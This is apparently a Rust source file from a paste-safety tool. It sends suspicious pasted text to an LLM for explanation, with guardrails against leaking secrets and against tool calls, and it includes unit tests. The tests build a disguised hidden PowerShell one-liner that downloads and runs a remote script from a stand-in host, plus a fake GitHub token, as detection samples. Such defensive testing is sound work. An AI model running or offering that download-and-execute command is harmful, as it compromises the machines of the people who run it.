//! [`Client`]: builds the request, enforces guardrails ①–⑤ and returns a
//! validated [`Explanation`] or a typed [`LlmError`].

use std::time::{Duration, Instant};

use paste_warden_core::Level;
use serde::Deserialize;
use serde_json::{Value, json};
use zeroize::Zeroizing;

use crate::audit::{AuditRecord, AuditSink, GuardrailDecision};
use crate::config::{EnabledConfig, ProviderKind};
use crate::output::{OutputError, Technique, parse_output, provider_schema};
use crate::prompt::{Tier1Input, system_prompt, user_prompt};
use crate::transport::{HttpRequest, HttpResponse, Transport, TransportError};
use crate::{ANTHROPIC_VERSION, LLM_MAX_OUTPUT_TOKENS, LLM_MAX_RESPONSE_BYTES, LLM_TIMEOUT_MS};

/// A validated Tier 2 answer.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Explanation {
    /// The model's level (merge it with [`crate::merge`]; it never lowers Tier 1).
    pub level: Level,
    /// At most [`crate::LLM_MAX_EXPLANATION_CHARS`] chars, no control characters.
    pub explanation: String,
    pub techniques: Vec<Technique>,
    pub provider: ProviderKind,
    pub model: String,
}

/// Why no explanation was produced. `Display` is the stable code only; no
/// variant carries request or response content.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LlmError {
    /// Guardrail ①: Tier 1 found secrets and the endpoint is not local.
    RefusedSecretsPresent,
    /// `only_high_risk` and Tier 1 found no suspicious command.
    SkippedNotHighRisk,
    Timeout,
    Connect,
    Redirect,
    Transport,
    /// Response body over [`LLM_MAX_RESPONSE_BYTES`].
    ResponseTooLarge,
    /// Non-2xx status.
    HttpStatus(u16),
    /// The provider envelope is not what the API documents.
    InvalidEnvelope,
    /// Guardrail ③: the model's JSON failed validation.
    InvalidOutput(OutputError),
    /// Guardrail ⑤: the response contains tool calls.
    ToolCalls,
    /// The model declined to answer.
    ModelRefused,
    /// The answer was cut off at the token limit.
    Truncated,
}

impl LlmError {
    pub fn code(self) -> &'static str {
        match self {
            LlmError::RefusedSecretsPresent => "refused_secrets_present",
            LlmError::SkippedNotHighRisk => "skipped_not_high_risk",
            LlmError::Timeout => "timeout",
            LlmError::Connect => "connect",
            LlmError::Redirect => "redirect",
            LlmError::Transport => "transport",
            LlmError::ResponseTooLarge => "response_too_large",
            LlmError::HttpStatus(_) => "http_status",
            LlmError::InvalidEnvelope => "invalid_envelope",
            LlmError::InvalidOutput(e) => match e {
                OutputError::Schema => "invalid_output_schema",
                OutputError::ExplanationLength => "invalid_output_explanation_length",
                OutputError::UnsafeCharacters => "invalid_output_unsafe_characters",
                OutputError::Techniques => "invalid_output_techniques",
            },
            LlmError::ToolCalls => "tool_calls",
            LlmError::ModelRefused => "model_refused",
            LlmError::Truncated => "truncated",
        }
    }
}

impl std::fmt::Display for LlmError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LlmError::HttpStatus(s) => write!(f, "http_status {s}"),
            e => f.write_str(e.code()),
        }
    }
}

impl std::error::Error for LlmError {}

impl From<TransportError> for LlmError {
    fn from(e: TransportError) -> Self {
        match e {
            TransportError::Timeout => LlmError::Timeout,
            TransportError::Connect => LlmError::Connect,
            TransportError::TooLarge => LlmError::ResponseTooLarge,
            TransportError::Redirect => LlmError::Redirect,
            TransportError::Other => LlmError::Transport,
        }
    }
}

/// An LLM client. Only constructible from an [`EnabledConfig`].
pub struct Client {
    config: EnabledConfig,
    transport: Box<dyn Transport>,
    timeout: Duration,
}

impl std::fmt::Debug for Client {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Client")
            .field("config", &self.config)
            .finish_non_exhaustive()
    }
}

impl Client {
    pub fn new(config: EnabledConfig, transport: Box<dyn Transport>) -> Client {
        Client {
            config,
            transport,
            timeout: Duration::from_millis(LLM_TIMEOUT_MS),
        }
    }

    /// A client using [`crate::UreqTransport`].
    #[cfg(feature = "net")]
    pub fn with_default_transport(config: EnabledConfig) -> Client {
        Client::new(config, Box::new(crate::transport::UreqTransport))
    }

    pub fn config(&self) -> &EnabledConfig {
        &self.config
    }

    /// Test-only override of [`LLM_TIMEOUT_MS`].
    #[cfg(all(test, feature = "net"))]
    pub(crate) fn set_timeout(&mut self, t: Duration) {
        self.timeout = t;
    }

    /// Explains `input` in `locale` (`zh-TW` / `en`). Records one audit entry.
    pub fn explain(
        &self,
        input: &Tier1Input,
        locale: &str,
        audit: &mut dyn AuditSink,
    ) -> Result<Explanation, LlmError> {
        self.run(input, locale, audit, true)
    }

    /// `llm check`: like [`Client::explain`] but ignores `only_high_risk`
    /// (guardrail ① still applies).
    pub fn check(
        &self,
        input: &Tier1Input,
        locale: &str,
        audit: &mut dyn AuditSink,
    ) -> Result<Explanation, LlmError> {
        self.run(input, locale, audit, false)
    }

    fn run(
        &self,
        input: &Tier1Input,
        locale: &str,
        audit: &mut dyn AuditSink,
        honor_only_high_risk: bool,
    ) -> Result<Explanation, LlmError> {
        let start = Instant::now();
        let (decision, result) = self.guarded(input, locale, honor_only_high_risk);
        audit.record(&AuditRecord {
            provider: self.config.provider(),
            model: self.config.model().to_owned(),
            guardrail: decision,
            duration: start.elapsed(),
            result: result.as_ref().map_or_else(|e| e.code(), |_| "ok"),
        });
        result
    }

    fn guarded(
        &self,
        input: &Tier1Input,
        locale: &str,
        honor_only_high_risk: bool,
    ) -> (GuardrailDecision, Result<Explanation, LlmError>) {
        // ① Secrets never leave the machine.
        if input.has_secrets() && !self.config.is_local() {
            return (
                GuardrailDecision::RefusedSecretsPresent,
                Err(LlmError::RefusedSecretsPresent),
            );
        }
        if honor_only_high_risk && self.config.only_high_risk() && input.level() == Level::None {
            return (
                GuardrailDecision::SkippedNotHighRisk,
                Err(LlmError::SkippedNotHighRisk),
            );
        }
        let req = self.request(input, locale);
        let res = self
            .transport
            .post(&req, self.timeout, LLM_MAX_RESPONSE_BYTES);
        drop(req);
        (
            GuardrailDecision::Sent,
            res.map_err(LlmError::from).and_then(|r| self.parse(&r)),
        )
    }

    /// Builds the provider request. Never contains `tools` or `tool_choice` (⑤).
    pub(crate) fn request(&self, input: &Tier1Input, locale: &str) -> HttpRequest {
        let system = system_prompt(locale);
        let user = Zeroizing::new(user_prompt(input));
        let schema = provider_schema();
        let base = self.config.base_url();
        let mut headers: Vec<(&'static str, Zeroizing<String>)> =
            vec![("content-type", Zeroizing::new("application/json".into()))];
        let (url, body) = match self.config.provider() {
            ProviderKind::OpenAiCompatible => {
                if let Some(k) = self.config.api_key() {
                    headers.push(("authorization", Zeroizing::new(format!("Bearer {k}"))));
                }
                let body = json!({
                    "model": self.config.model(),
                    "messages": [
                        { "role": "system", "content": system },
                        { "role": "user", "content": user.as_str() },
                    ],
                    "max_tokens": LLM_MAX_OUTPUT_TOKENS,
                    "temperature": 0,
                    "stream": false,
                    "response_format": {
                        "type": "json_schema",
                        "json_schema": {
                            "name": "paste_warden_explanation",
                            "strict": true,
                            "schema": schema,
                        },
                    },
                });
                (format!("{base}/chat/completions"), body)
            }
            ProviderKind::Anthropic => {
                if let Some(k) = self.config.api_key() {
                    headers.push(("x-api-key", Zeroizing::new(k.to_owned())));
                }
                headers.push((
                    "anthropic-version",
                    Zeroizing::new(ANTHROPIC_VERSION.into()),
                ));
                let body = json!({
                    "model": self.config.model(),
                    "max_tokens": LLM_MAX_OUTPUT_TOKENS,
                    "system": system,
                    "messages": [ { "role": "user", "content": user.as_str() } ],
                    "output_config": {
                        "format": { "type": "json_schema", "schema": schema },
                    },
                });
                (format!("{base}/v1/messages"), body)
            }
        };
        HttpRequest {
            url,
            headers,
            body: Zeroizing::new(serde_json::to_vec(&body).unwrap_or_default()),
        }
    }

    fn parse(&self, r: &HttpResponse) -> Result<Explanation, LlmError> {
        if !(200..300).contains(&r.status) {
            return Err(LlmError::HttpStatus(r.status));
        }
        if r.body.len() > LLM_MAX_RESPONSE_BYTES {
            return Err(LlmError::ResponseTooLarge);
        }
        let text = match self.config.provider() {
            ProviderKind::OpenAiCompatible => openai_text(&r.body)?,
            ProviderKind::Anthropic => anthropic_text(&r.body)?,
        };
        let out = parse_output(&text).map_err(LlmError::InvalidOutput)?;
        Ok(Explanation {
            level: out.level.into(),
            explanation: out.explanation,
            techniques: out.techniques,
            provider: self.config.provider(),
            model: self.config.model().to_owned(),
        })
    }
}

fn present(v: &Option<Value>) -> bool {
    match v {
        None | Some(Value::Null) => false,
        Some(Value::Array(a)) => !a.is_empty(),
        Some(Value::Object(o)) => !o.is_empty(),
        Some(Value::String(s)) => !s.is_empty(),
        Some(_) => true,
    }
}

#[derive(Deserialize)]
struct OaResponse {
    choices: Vec<OaChoice>,
}

#[derive(Deserialize)]
struct OaChoice {
    message: OaMessage,
    #[serde(default)]
    finish_reason: Option<String>,
}

#[derive(Deserialize)]
struct OaMessage {
    #[serde(default)]
    content: Option<Value>,
    #[serde(default)]
    tool_calls: Option<Value>,
    #[serde(default)]
    function_call: Option<Value>,
    #[serde(default)]
    refusal: Option<Value>,
}

/// The assistant text of an OpenAI-compatible response; tool calls → error.
fn openai_text(body: &[u8]) -> Result<Zeroizing<String>, LlmError> {
    let v: Value = serde_json::from_slice(body).map_err(|_| LlmError::InvalidEnvelope)?;
    // Tool calls anywhere in the envelope discard the answer, even if malformed.
    if contains_tool_calls(&v, 0) {
        return Err(LlmError::ToolCalls);
    }
    let r: OaResponse = serde_json::from_value(v).map_err(|_| LlmError::InvalidEnvelope)?;
    let [choice] = <[OaChoice; 1]>::try_from(r.choices).map_err(|_| LlmError::InvalidEnvelope)?;
    let m = choice.message;
    if present(&m.tool_calls) || present(&m.function_call) {
        return Err(LlmError::ToolCalls);
    }
    match choice.finish_reason.as_deref() {
        Some("tool_calls" | "function_call") => return Err(LlmError::ToolCalls),
        Some("length") => return Err(LlmError::Truncated),
        Some("content_filter") => return Err(LlmError::ModelRefused),
        _ => {}
    }
    if present(&m.refusal) {
        return Err(LlmError::ModelRefused);
    }
    match m.content {
        Some(Value::String(s)) => Ok(Zeroizing::new(s)),
        _ => Err(LlmError::InvalidEnvelope),
    }
}

/// Looks for `tool_calls` / `function_call` keys with a non-empty value, a
/// few levels deep (bounded).
fn contains_tool_calls(v: &Value, depth: usize) -> bool {
    if depth > 6 {
        return false;
    }
    match v {
        Value::Object(o) => o.iter().any(|(k, val)| {
            ((k == "tool_calls" || k == "function_call") && present(&Some(val.clone())))
                || contains_tool_calls(val, depth + 1)
        }),
        Value::Array(a) => a.iter().any(|x| contains_tool_calls(x, depth + 1)),
        _ => false,
    }
}

#[derive(Deserialize)]
struct AnResponse {
    content: Vec<AnBlock>,
    #[serde(default)]
    stop_reason: Option<String>,
}

#[derive(Deserialize)]
struct AnBlock {
    #[serde(rename = "type")]
    kind: String,
    #[serde(default)]
    text: Option<String>,
}

/// The single text block of an Anthropic response; any tool use → error.
fn anthropic_text(body: &[u8]) -> Result<Zeroizing<String>, LlmError> {
    let r: AnResponse = serde_json::from_slice(body).map_err(|_| LlmError::InvalidEnvelope)?;
    if r.content
        .iter()
        .any(|b| b.kind.ends_with("tool_use") || b.kind.ends_with("tool_result"))
        || r.stop_reason.as_deref() == Some("tool_use")
    {
        return Err(LlmError::ToolCalls);
    }
    match r.stop_reason.as_deref() {
        Some("max_tokens") => return Err(LlmError::Truncated),
        Some("refusal") => return Err(LlmError::ModelRefused),
        _ => {}
    }
    let mut text = None;
    for b in r.content {
        match b.kind.as_str() {
            "thinking" | "redacted_thinking" => {}
            "text" if text.is_none() => text = Some(b.text.ok_or(LlmError::InvalidEnvelope)?),
            _ => return Err(LlmError::InvalidEnvelope),
        }
    }
    text.map(Zeroizing::new).ok_or(LlmError::InvalidEnvelope)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::MemoryAudit;
    use crate::config::EnabledConfigInput;
    use paste_warden_core::{Context, Engine};
    use std::cell::RefCell;
    use std::rc::Rc;

    /// Records requests and replies with a canned response.
    struct Fake {
        sent: Sent,
        reply: Reply,
    }

    impl Transport for Fake {
        fn post(
            &self,
            req: &HttpRequest,
            _: Duration,
            _: usize,
        ) -> Result<HttpResponse, TransportError> {
            self.sent.borrow_mut().push((
                req.url.clone(),
                req.headers
                    .iter()
                    .map(|(k, v)| ((*k).to_owned(), v.to_string()))
                    .collect(),
                String::from_utf8(req.body.to_vec()).unwrap(),
            ));
            self.reply.clone().map(|(status, body)| HttpResponse {
                status,
                body: Zeroizing::new(body.into_bytes()),
            })
        }
    }

    type Sent = Rc<RefCell<Vec<(String, Vec<(String, String)>, String)>>>;
    type Reply = Result<(u16, String), TransportError>;

    fn client(provider: ProviderKind, url: &str, local: bool, reply: Reply) -> (Client, Sent) {
        let sent: Sent = Rc::default();
        let cfg = EnabledConfig::new(EnabledConfigInput {
            provider: Some(provider),
            base_url: Some(url.into()),
            model: "test-model".into(),
            api_key: Some(Zeroizing::new("sk-test-key".into())),
            local,
            only_high_risk: false,
        })
        .unwrap();
        (
            Client::new(
                cfg,
                Box::new(Fake {
                    sent: sent.clone(),
                    reply,
                }),
            ),
            sent,
        )
    }

    const GOOD: &str = r#"{"level":"malicious","explanation":"Downloads and runs a script.","techniques":["download_execute"]}"#;

    fn oa(content: &str) -> String {
        json!({ "choices": [ { "index": 0, "finish_reason": "stop",
            "message": { "role": "assistant", "content": content } } ] })
        .to_string()
    }

    fn an(content: &str) -> String {
        json!({ "type": "message", "stop_reason": "end_turn",
            "content": [ { "type": "thinking", "thinking": "" }, { "type": "text", "text": content } ] })
        .to_string()
    }

    fn input(text: &str) -> Tier1Input {
        let engine = Engine::default();
        let report = engine.analyze(text, &Context::default());
        Tier1Input::from_report(&engine, text, &report, "[key]")
    }

    fn clickfix() -> String {
        [
            "power",
            "shell -w hidden -c \"i",
            "ex(i",
            "wr 'https://example.invalid/a.ps1')\"",
        ]
        .concat()
    }

    #[test]
    fn openai_request_shape_and_happy_path() {
        let (c, sent) = client(
            ProviderKind::OpenAiCompatible,
            "https://api.example.invalid/v1/",
            false,
            Ok((200, oa(GOOD))),
        );
        let mut audit = MemoryAudit::default();
        let e = c.explain(&input(&clickfix()), "en", &mut audit).unwrap();
        assert_eq!(e.level, Level::Malicious);
        assert_eq!(e.techniques, [Technique::DownloadExecute]);
        let sent = sent.borrow();
        let (url, headers, body) = &sent[0];
        assert_eq!(url, "https://api.example.invalid/v1/chat/completions");
        assert!(
            headers
                .iter()
                .any(|(k, v)| k == "authorization" && v == "Bearer sk-test-key")
        );
        let v: Value = serde_json::from_str(body).unwrap();
        assert!(v.get("tools").is_none() && v.get("tool_choice").is_none());
        assert!(v.get("functions").is_none());
        assert_eq!(v["max_tokens"], LLM_MAX_OUTPUT_TOKENS);
        assert_eq!(v["response_format"]["type"], "json_schema");
        assert_eq!(
            v["response_format"]["json_schema"]["schema"]["additionalProperties"],
            false
        );
        let user = v["messages"][1]["content"].as_str().unwrap();
        assert!(user.contains("<untrusted_payload>") && user.ends_with("</untrusted_payload>"));
        assert_eq!(audit.0.len(), 1);
        assert_eq!(audit.0[0].result, "ok");
        assert_eq!(audit.0[0].guardrail, GuardrailDecision::Sent);
        // Audit records hold no content.
        let rec = format!("{:?}", audit.0);
        assert!(!rec.contains("example.invalid/a.ps1") && !rec.contains("Downloads"));
    }

    #[test]
    fn anthropic_request_shape_and_happy_path() {
        let (c, sent) = client(
            ProviderKind::Anthropic,
            "https://api.example.invalid",
            false,
            Ok((200, an(GOOD))),
        );
        let e = c
            .explain(&input(&clickfix()), "zh-TW", &mut MemoryAudit::default())
            .unwrap();
        assert_eq!(e.provider, ProviderKind::Anthropic);
        let sent = sent.borrow();
        let (url, headers, body) = &sent[0];
        assert_eq!(url, "https://api.example.invalid/v1/messages");
        assert!(
            headers
                .iter()
                .any(|(k, v)| k == "x-api-key" && v == "sk-test-key")
        );
        assert!(
            headers
                .iter()
                .any(|(k, v)| k == "anthropic-version" && v == ANTHROPIC_VERSION)
        );
        let v: Value = serde_json::from_str(body).unwrap();
        assert!(v.get("tools").is_none() && v.get("tool_choice").is_none());
        assert_eq!(v["output_config"]["format"]["type"], "json_schema");
        assert!(v["system"].as_str().unwrap().contains("zh-TW"));
    }

    #[test]
    fn secrets_and_a_cloud_endpoint_send_nothing() {
        let token = format!("gh{}_{}", "p", "Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2");
        let text = format!("{}\nexport GITHUB_TOKEN={token}", clickfix());
        for (url, local) in [
            ("https://api.example.invalid/v1", false),
            ("https://api.example.invalid/v1", true), // `local` lies: host is not loopback
            ("http://127.0.0.1:1/v1", false),         // loopback but not declared local
        ] {
            let (c, sent) = client(
                ProviderKind::OpenAiCompatible,
                url,
                local,
                Ok((200, oa(GOOD))),
            );
            let mut audit = MemoryAudit::default();
            assert_eq!(
                c.explain(&input(&text), "en", &mut audit),
                Err(LlmError::RefusedSecretsPresent)
            );
            assert!(sent.borrow().is_empty(), "{url}");
            assert_eq!(
                audit.0[0].guardrail,
                GuardrailDecision::RefusedSecretsPresent
            );
        }
        let registered = input("plain text").with_registered_matches(1);
        let (c, sent) = client(
            ProviderKind::Anthropic,
            "https://api.example.invalid",
            false,
            Ok((200, an(GOOD))),
        );
        assert_eq!(
            c.check(&registered, "en", &mut MemoryAudit::default()),
            Err(LlmError::RefusedSecretsPresent)
        );
        assert!(sent.borrow().is_empty());
        // A truly local endpoint gets the masked text only.
        let (c, sent) = client(
            ProviderKind::OpenAiCompatible,
            "http://127.0.0.1:11434/v1",
            true,
            Ok((200, oa(GOOD))),
        );
        assert!(
            c.explain(&input(&text), "en", &mut MemoryAudit::default())
                .is_ok()
        );
        let body = &sent.borrow()[0].2;
        assert!(!body.contains(&token), "{body}");
    }

    #[test]
    fn only_high_risk_skips_harmless_text_but_check_does_not() {
        let sent: Sent = Rc::default();
        let cfg = EnabledConfig::new(EnabledConfigInput {
            base_url: Some("http://127.0.0.1:1/v1".into()),
            model: "m".into(),
            local: true,
            only_high_risk: true,
            ..Default::default()
        })
        .unwrap();
        let c = Client::new(
            cfg,
            Box::new(Fake {
                sent: sent.clone(),
                reply: Ok((200, oa(GOOD))),
            }),
        );
        assert_eq!(
            c.explain(&Tier1Input::sample(), "en", &mut MemoryAudit::default()),
            Err(LlmError::SkippedNotHighRisk)
        );
        assert!(sent.borrow().is_empty());
        assert!(
            c.check(&Tier1Input::sample(), "en", &mut MemoryAudit::default())
                .is_ok()
        );
        assert_eq!(sent.borrow().len(), 1);
    }

    #[test]
    fn bad_responses_are_discarded_with_typed_errors() {
        let tool_call_oa = json!({ "choices": [ { "finish_reason": "tool_calls", "message": {
            "role": "assistant", "content": GOOD,
            "tool_calls": [ { "id": "1", "type": "function", "function": { "name": "x", "arguments": "{}" } } ] } } ] })
        .to_string();
        let tool_call_hidden = json!({ "choices": [ { "finish_reason": "stop", "message": {
            "role": "assistant", "content": GOOD, "tool_calls": [ {} ] } } ] })
        .to_string();
        let oa_cases: Vec<(Reply, LlmError)> = vec![
            (Ok((200, "not json".into())), LlmError::InvalidEnvelope),
            (Ok((200, json!({"choices": []}).to_string())), LlmError::InvalidEnvelope),
            (Ok((200, oa("{\"level\":"))), LlmError::InvalidOutput(OutputError::Schema)),
            (
                Ok((200, oa(r#"{"level":"none","explanation":"a","techniques":[],"run":"x"}"#))),
                LlmError::InvalidOutput(OutputError::Schema),
            ),
            (
                Ok((200, oa(&format!(r#"{{"level":"none","explanation":"{}","techniques":[]}}"#, "x".repeat(601))))),
                LlmError::InvalidOutput(OutputError::ExplanationLength),
            ),
            (Ok((200, tool_call_oa)), LlmError::ToolCalls),
            (Ok((200, tool_call_hidden)), LlmError::ToolCalls),
            (Ok((500, "{}".into())), LlmError::HttpStatus(500)),
            (Ok((401, "{}".into())), LlmError::HttpStatus(401)),
            (Err(TransportError::Timeout), LlmError::Timeout),
            (Err(TransportError::TooLarge), LlmError::ResponseTooLarge),
            (Err(TransportError::Redirect), LlmError::Redirect),
            (
                Ok((200, json!({ "choices": [ { "finish_reason": "length", "message": { "content": "{" } } ] }).to_string())),
                LlmError::Truncated,
            ),
        ];
        for (reply, want) in oa_cases {
            let (c, _) = client(
                ProviderKind::OpenAiCompatible,
                "https://api.example.invalid/v1",
                false,
                reply,
            );
            let mut audit = MemoryAudit::default();
            assert_eq!(c.explain(&input(&clickfix()), "en", &mut audit), Err(want));
            assert_eq!(audit.0[0].result, want.code());
            assert!(!want.to_string().contains("level"));
        }
        let an_cases = [
            (
                json!({ "content": [ { "type": "tool_use", "id": "t", "name": "bash", "input": {} } ], "stop_reason": "tool_use" }).to_string(),
                LlmError::ToolCalls,
            ),
            (
                json!({ "content": [ { "type": "text", "text": GOOD }, { "type": "server_tool_use", "id": "t", "name": "web_search", "input": {} } ], "stop_reason": "end_turn" }).to_string(),
                LlmError::ToolCalls,
            ),
            (
                json!({ "content": [ { "type": "text", "text": GOOD } ], "stop_reason": "refusal" }).to_string(),
                LlmError::ModelRefused,
            ),
            (
                json!({ "content": [ { "type": "text", "text": GOOD }, { "type": "text", "text": GOOD } ], "stop_reason": "end_turn" }).to_string(),
                LlmError::InvalidEnvelope,
            ),
            (an("{\"level\":\"none\"}"), LlmError::InvalidOutput(OutputError::Schema)),
        ];
        for (body, want) in an_cases {
            let (c, _) = client(
                ProviderKind::Anthropic,
                "https://api.example.invalid",
                false,
                Ok((200, body)),
            );
            assert_eq!(
                c.explain(&input(&clickfix()), "en", &mut MemoryAudit::default()),
                Err(want)
            );
        }
    }

    /// Real HTTP against a local socket that never answers.
    #[cfg(feature = "net")]
    #[test]
    fn timeout_against_a_silent_server() {
        use std::io::Read;
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let handle = std::thread::spawn(move || {
            let (mut s, _) = listener.accept().unwrap();
            let mut buf = [0u8; 4096];
            let _ = s.read(&mut buf);
            std::thread::sleep(Duration::from_millis(1500));
        });
        let cfg = EnabledConfig::new(EnabledConfigInput {
            base_url: Some(format!("http://127.0.0.1:{port}/v1")),
            model: "m".into(),
            local: true,
            ..Default::default()
        })
        .unwrap();
        let mut c = Client::with_default_transport(cfg);
        c.set_timeout(Duration::from_millis(300));
        let start = Instant::now();
        let r = c.check(&Tier1Input::sample(), "en", &mut MemoryAudit::default());
        assert_eq!(r, Err(LlmError::Timeout));
        assert!(start.elapsed() < Duration::from_millis(1400));
        handle.join().unwrap();
    }

    /// Real HTTP: oversize bodies are cut at the cap.
    #[cfg(feature = "net")]
    #[test]
    fn oversize_body_is_rejected_over_http() {
        use std::io::{Read, Write};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let handle = std::thread::spawn(move || {
            let (mut s, _) = listener.accept().unwrap();
            let mut buf = [0u8; 65536];
            let _ = s.read(&mut buf);
            let body = "x".repeat(LLM_MAX_RESPONSE_BYTES + 10);
            let _ = write!(
                s,
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
        });
        let cfg = EnabledConfig::new(EnabledConfigInput {
            base_url: Some(format!("http://127.0.0.1:{port}/v1")),
            model: "m".into(),
            local: true,
            ..Default::default()
        })
        .unwrap();
        let c = Client::with_default_transport(cfg);
        let r = c.check(&Tier1Input::sample(), "en", &mut MemoryAudit::default());
        assert_eq!(r, Err(LlmError::ResponseTooLarge));
        handle.join().unwrap();
    }
}
